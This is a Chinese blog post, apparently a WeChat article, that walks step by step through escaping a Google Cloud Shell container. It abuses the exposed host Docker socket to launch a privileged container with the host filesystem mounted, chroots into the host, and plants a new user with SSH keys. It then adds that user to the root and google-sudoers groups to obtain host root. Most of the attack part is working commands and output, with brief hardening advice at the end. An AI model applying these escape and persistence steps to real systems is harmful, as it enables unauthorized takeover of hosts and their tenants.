<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rzrd93jhb5sDzOkKBmnsfA)

**0x00简介**

Google Cloud Shell是一款Web IDE，和Coding的Cloud Studio以及GitHub的Codespace算是一类东西。这些服务提供了一个服务器，用户可以通过浏览器在上面编写代码、运行程序。在这些平台上，用户的操作都是在Docker容器里运行的。（当然也不排除有财大气粗的厂子开VM） 这几天我在Google Cloud Shell漫游的时候突然发现一个小东西：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouOasNNfLCGVibZDwnhH2Xr0hdgnFeVqcicxj4WORvtMvDz3Gk4InCv4ZjGEVbeCAbxkzV9vTL1gIgvw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

好家伙，看看这目录名，也许是宿主机的docker服务套接字？这不就能搞一发容器逃逸？走起

  

**0x01 容器逃逸**
=============

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouOasNNfLCGVibZDwnhH2Xr0hPd2v7DicabCO6D8COpfQB3S4rMBcduAXwp6cfNyVRcJvhvGEFJDkgtw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

Google Cloud Shell（以下简称GCS）很贴心地为我们预装了docker。我们来连接一下宿主机docker sock

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouOasNNfLCGVibZDwnhH2Xr0hTrAdov7UQ7hMy39jNZYria7SPJ3icUm9pOLzGlqCu3YCn6nPeBCiaEkPA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

```
`Client:` `Context:   default` `Debug Mode: false` `Plugins:` `app: Docker App (Docker Inc., v0.9.1-beta3)` `buildx: Docker Buildx (Docker Inc., v0.8.2-docker)` `scan: Docker Scan (Docker Inc., v0.17.0)``Server:` `Containers: 11` `Running: 10` `Paused: 0` `Stopped: 1` `Images: 15` `Server Version: 20.10.6` `Storage Driver: overlay2` `Backing Filesystem: extfs` `Supports d_type: true` `Native Overlay Diff: true` `userxattr: false` `Logging Driver: json-file` `Cgroup Driver: cgroupfs` `Cgroup Version: 1` `Plugins:` `Volume: local` `Network: bridge host ipvlan macvlan null overlay` `Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog` `Swarm: inactive` `Runtimes: runc io.containerd.runc.v2 io.containerd.runtime.v1.linux` `Default Runtime: runc` `Init Binary: docker-init` `containerd version: 3df54a852345ae127d1fa3092b95168e4a88e2f8` `runc version: f46b6ba2c9314cfc8caae24a32ec5fe9ef1059fe` `init version: fec3683b971d9c3ef73f284f176672c44b448662 (expected: de40ad007797e0dcd8b7126f27bb87401d224240)` `Security Options:` `apparmor` `seccomp` `Profile: default` `Kernel Version: 5.10.109+` `Operating System: Container-Optimized OS from Google` `OSType: linux` `Architecture: x86_64` `CPUs: 4` `Total Memory: 15.63GiB` `Name: boost-wlcxb` `ID: YFEE:QP2R:H2BW:QM63:XAYP:MEXS:VZ26:LW6W:YIXA:HIAL:JQ7H:GO23` `Docker Root Dir: /var/lib/docker` `Debug Mode: false` `Registry: https://index.docker.io/v1/` `Labels:` `Experimental: false` `Insecure Registries:` `127.0.0.0/8` `Registry Mirrors:` `https://mirror.gcr.io/` `Live Restore Enabled: true`
```

但是我们需要注意输出内容里面提到的系统信息：

```
Container-Optimized OS from Google
```

这是谷歌发布的一款对Docker容器进行优化的精简操作系统，基于Chromium OS制作。精简到什么程度呢？这个系统没有dpkg、apt、yum、pacman、rpm等包管理器，系统有锁定的防火墙，/etc目录重启丢失，几乎系统所有目录都是只读

  
但很遗憾——Docker默认以root身份操作。我们可以通过这个宿主机套接字逃出GCS的容器，进入宿主机甚至提权到宿主机root。我们给自己开个privileged容器吧，以后好干活

```
`sudo docker -H unix:///google/host/var/run/docker.sock pull ubuntu:latest #在宿主机上拉取一个ubuntu docker镜像``sudo docker -H unix:///google/host/var/run/docker.sock run -itd \` `--name ltdoge \` `-v "/:/host" \ #把宿主机根目录挂载到容器/host，阴阳之门就此打开` `--network=host \ #使用宿主机网络，免得新容器上不去网` `--privileged=true \ #特权模式` `--cap-add=ALL \ #放开所有权限` `ubuntu:latest``sudo docker -H unix:///google/host/var/run/docker.sock start ltdoge #启动容器``sudo docker -H unix:///google/host/var/run/docker.sock exec -it ltdoge /bin/bash #进入新容器`
```

至此，我们已经完成容器逃逸——从新建的privileged容器中可以访问到宿主机文件，甚至是随意修改

  

**0x02 获取宿主机Shell**
===================

先把ubuntu容器的系统文件补全

```
`unminimize``apt install ssh`
```

怎么拿Shell呢？网络上的常用方法是写一个cron执行nc回弹一个Shell会话。但很遗憾，宿主机上没有运行crontab服务。不过我们都有宿主机根目录了诶，为什么不直接用呢？Docker是个应用容器，又不是VM。Docker是和宿主机共用系统内核的

```
chroot /host /bin/bash
```

这样我们就以/host为根目录运行了一个bash，所有操作都会被当作在宿主机的根目录执行。而且我们的容器用户是root，在chroot中的操作会被认为以宿主机的root用户执行。不过这个root并不完全，仅仅是在文件系统层面上实现了root，systemctl指令会报错的。我们的目标是拿到宿主机的完完全全的Shell。一不小心执行一下netstat -anp，再一不小心注意到一个开放端口：

```
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      461/sshd: /usr/sbin
```

哦豁，宿主机上竟然有ssh。（容器和宿主机共用网络，所以能扫到宿主机端口） 退出chroot，一不小心连接一下：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouOasNNfLCGVibZDwnhH2Xr0hTRbrmZd5UaBMAxboWLibianBJ4syjQMkuJ2u1H8qM94ZeVp3HbRiaorEw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

公钥认证？没开密码认证？过一遍sshd_config：

```
`# Force protocol v2 only``Protocol 2``# Disable IPv6 for now``AddressFamily inet``# /etc is read-only.  Fetch keys from stateful partition``# Not using v1, so no v1 key``HostKey /mnt/stateful_partition/etc/ssh/ssh_host_rsa_key``HostKey /mnt/stateful_partition/etc/ssh/ssh_host_ed25519_key``PasswordAuthentication no``ChallengeResponseAuthentication no``PermitRootLogin no``UsePAM yes``PrintMotd no``PrintLastLog no``UseDns no``Subsystem sftp internal-sftp``PermitTunnel no``AllowTcpForwarding yes``X11Forwarding no``Ciphers aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr``# Compute times out connections after 10 minutes of inactivity.  Keep alive``# ssh connections by sending a packet every 7 minutes.``ClientAliveInterval 420``AcceptEnv EDITOR LANG LC_ALL PAGER TZ`
```

好家伙，不仅没开密码验证，还把root登录关了。再次回到chroot，开一个新账户：

```
`mkdir /home/ltdoge``useradd -d /home/ltdoge -s /bin/bash ltdoge``chown ltdoge /home/ltdoge``passwd ltdoge #改一下密码`
```

然后退到容器，生成一份公私钥，并传到宿主机：

```
`ssh-keygen -t rsa``mkdir /host/home/ltdoge/.ssh``cp ~/.ssh/id_rsa.pub /host/home/ltdoge/.ssh/authorized_keys`
```

ssh连接ltdoge@127.0.0.1，成功获取宿主机Shell

  

**0x03 提权root**
===============

在容器里改一下sudoers文件

```
`apt install nano``nano /host/etc/sudoers``#在sudoers中把root那行复制过来，用户名改成ltdoge`
```

然后ssh连接宿主机，sudo su，输入密码——

Sorry, try again.

  

惊不惊喜？意不意外？不管你设置什么密码，sudo就是过不去。我们需要曲线救国。翻阅sudoers文件，可以看到末尾有个IncludeDir：

```
`## Read drop-in files from /etc/sudoers.d``@includedir /etc/sudoers.d`
```

转到/etc/sudoers.d，可以发现里面有个google-sudoers文件

```
%google-sudoers ALL=(ALL:ALL) NOPASSWD:ALL 
```

好家伙，还是无密码认证。退回容器进入chroot，把ltdoge用户拉入管理组：

```
`gpasswd -a ltdoge root``gpasswd -a ltdoge google-sudoers`
```

再次连接ssh，sudo su：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouOasNNfLCGVibZDwnhH2Xr0hkU8IINx5q5wqb3K07M0XvaYJVNcKLib5EhEycs2YAbw0JiaPCL6mguAg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

成功获取宿主机root权限

  

**0x04 总结**
===========

1.这个容器逃逸漏洞其实在2020年就有人发现了，好像这还是第一个拿到谷歌的啥奖金的漏洞，但是我用了全新的提权方法。

谷歌付了钱没有修洞，我不知道是啥意思

2.Docker默认是以root执行的，各位平时开容器的时候如果需要暴露到外网千万别闲着没事干带个--privileged

3.别瞎挂载目录